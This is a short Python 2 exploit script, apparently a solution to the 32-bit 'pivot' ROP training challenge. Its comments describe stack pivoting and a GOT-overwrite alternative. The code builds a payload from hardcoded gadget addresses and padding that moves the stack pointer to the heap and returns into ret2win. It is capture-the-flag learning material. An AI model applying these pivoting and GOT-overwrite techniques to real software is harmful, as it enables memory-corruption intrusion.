import struct

# in this challenge we can only write 58 bytes to the stack which is not enough
# so we are given 256 bytes in the heap that we can write and then pivot to.
# This is a quick way to solve this challenge
# all you have to do is pivot esp from the stack to the heap and then return from there to ret2win since libpivot32 is already loaded
# another way to solve this challenge is to call foothold then overwrite the address
# of foothold is .got by adding to it the difference between its address in libpivot32 and the address of ret2win in libpivot32 (got overwrite)
# then calling foothold agian directly thorugh the plt or through the uselessfunction in the pivot32 binary, and when you do that ret2win will be called instead of foothold
# the second method works better with ASLR (only if the binary is not PIE)
# ince we are only refrencing .plt and .got in that case and not doing ret2libpivot32
# in case the binary was PIE then ROPing becomes much harder since everything would be randomized

pop_eax = 0x080488c0
xchg_esp_eax = 0x080488c2
heap_chain = 0xb7dd6f10
add_eax_ebx = 0x080488c7
ret2win_addr = 0xb7fce967

p = ""

# written to the heap
p += struct.pack("I", ret2win_addr)
p += "\xff\xff\xff\xff" # ret addr		
p += "\n"		# separator

# written to the stacck
p += "B"*44
# pivot to heap
p += struct.pack("I", pop_eax)
p += struct.pack("I", heap_chain)
p += struct.pack("I", xchg_esp_eax)

print(p)
